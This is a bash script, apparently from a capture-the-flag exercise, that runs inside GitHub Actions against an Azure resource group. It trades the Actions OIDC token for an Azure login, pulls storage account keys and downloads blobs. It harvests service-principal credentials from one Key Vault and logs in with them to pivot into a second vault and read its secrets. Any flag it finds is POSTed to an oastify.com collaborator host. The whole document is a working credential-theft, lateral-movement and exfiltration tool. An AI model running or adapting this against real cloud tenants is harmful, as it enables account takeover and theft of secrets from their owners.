#!/usr/bin/env bash
# Tebamoto Logistics - step 5, run 3: pivot into kv-tbl-sec-x3euoz.
#
# Read-only. Scoped to rg-tbl-platform-prod-sea in the Cyber Jutsu subscription.
# The Actions log of a public repo is world-readable and these are real credentials
# in a shared subscription, so NO secret value is ever echoed. Only the flag is sent
# out-of-band; the log gets names, lengths and match/no-match.
set -uo pipefail

COLLAB="qd7hc0dfk4496dnnphwewgj2dtjo778imqpse.oastify.com"
RG="rg-tbl-platform-prod-sea"
SRC_VAULT="kv-tbl-prod-x3euoz"
TGT_VAULT="kv-tbl-sec-x3euoz"
FLAGRE='DF26\{[^}]+\}'
FOUND=""

say() { echo "[*] $*"; }

# ---------------------------------------------------------------- federate
OIDC=$(curl -sS -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2FAzureADTokenExchange" | jq -r '.value // empty')
[ -z "$OIDC" ] && { say "no OIDC token"; exit 1; }
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$OIDC" --allow-no-subscriptions >/dev/null 2>&1 \
  && say "federated login OK" || { say "federated login FAILED"; exit 1; }

# ---------------------------------------------------------------- storage first (cheap, no pivot)
say "=== storage containers (stderr NOT swallowed this time) ==="
for A in $(az storage account list -g "$RG" --query "[].name" -o tsv 2>/dev/null); do
  say "  account=$A"
  OUT=$(az storage container list --account-name "$A" --auth-mode login --query "[].name" -o tsv 2>&1)
  if grep -qiE 'error|denied|forbidden|not authorized' <<<"$OUT"; then
    say "    AAD list -> $(head -c 160 <<<"$OUT" | tr -d '\n')"
    K=$(az storage account keys list -n "$A" -g "$RG" --query "[0].value" -o tsv 2>&1)
    if [ ${#K} -ge 40 ]; then
      OUT=$(az storage container list --account-name "$A" --account-key "$K" --query "[].name" -o tsv 2>&1)
      say "    key list -> $(head -c 160 <<<"$OUT" | tr -d '\n')"
    else
      say "    keys -> $(head -c 160 <<<"$K" | tr -d '\n')"
      continue
    fi
  fi
  for C in $OUT; do
    say "    container=$C"
    for B in $(az storage blob list --account-name "$A" --auth-mode login -c "$C" --query "[].name" -o tsv 2>/dev/null); do
      D=$(az storage blob download --account-name "$A" --auth-mode login -c "$C" -n "$B" --file /dev/stdout -o none 2>/dev/null)
      M=$(grep -oE "$FLAGRE" <<<"$D" | head -1)
      say "      blob=$C/$B len=${#D} flag=${M:+MATCH}${M:--}"
      [ -n "$M" ] && FOUND="$M"
    done
  done
done

# ---------------------------------------------------------------- pivot
say "=== pivot: principals in $SRC_VAULT -> $TGT_VAULT ==="
for S in $(az keyvault secret list --vault-name "$SRC_VAULT" --query "[].name" -o tsv 2>/dev/null); do
  RAW=$(az keyvault secret show --vault-name "$SRC_VAULT" --name "$S" --query value -o tsv 2>/dev/null)
  [ -z "$RAW" ] && { say "  $S -> unreadable"; continue; }

  CID=$(jq -r '.clientId // .appId // .client_id // empty' <<<"$RAW" 2>/dev/null)
  SEC=$(jq -r '.clientSecret // .password // .client_secret // empty' <<<"$RAW" 2>/dev/null)
  TEN=$(jq -r '.tenantId // .tenant // .tenant_id // empty' <<<"$RAW" 2>/dev/null)
  [ -z "$CID" ] && { say "  $S -> not an SP credential (keys: $(jq -r 'keys|join(",")' <<<"$RAW" 2>/dev/null))"; continue; }

  az logout >/dev/null 2>&1
  if ! az login --service-principal -u "$CID" -p "$SEC" -t "${TEN:-$AZURE_TENANT_ID}" \
        --allow-no-subscriptions >/dev/null 2>&1; then
    say "  $S (${CID:0:8}…) -> login failed"
    continue
  fi

  LIST=$(az keyvault secret list --vault-name "$TGT_VAULT" --query "[].name" -o tsv 2>&1)
  if grep -qiE 'forbidden|not authorized|error' <<<"$LIST"; then
    say "  $S (${CID:0:8}…) -> login OK, $TGT_VAULT denied"
    continue
  fi

  say "  $S (${CID:0:8}…) -> UNLOCKED $TGT_VAULT"
  for T in $LIST; do
    V=$(az keyvault secret show --vault-name "$TGT_VAULT" --name "$T" --query value -o tsv 2>/dev/null)
    M=$(grep -oE "$FLAGRE" <<<"$V" | head -1)
    say "      secret=$T len=${#V} flag=${M:+MATCH}${M:--}"
    [ -n "$M" ] && FOUND="$M"
  done
  [ -n "$FOUND" ] && break
done

# ---------------------------------------------------------------- report
if [ -n "$FOUND" ]; then
  say "FLAG FOUND (${#FOUND} chars) - sending out-of-band, not printing here"
  curl -sS -m 25 -X POST --data-binary "$FOUND" -H 'Content-Type: text/plain' \
    "http://${COLLAB}/flag" -o /dev/null -w '    exfil http=%{http_code}\n' 2>&1
else
  say "no DF26{...} match in anything reachable"
fi
az logout >/dev/null 2>&1
say "done"
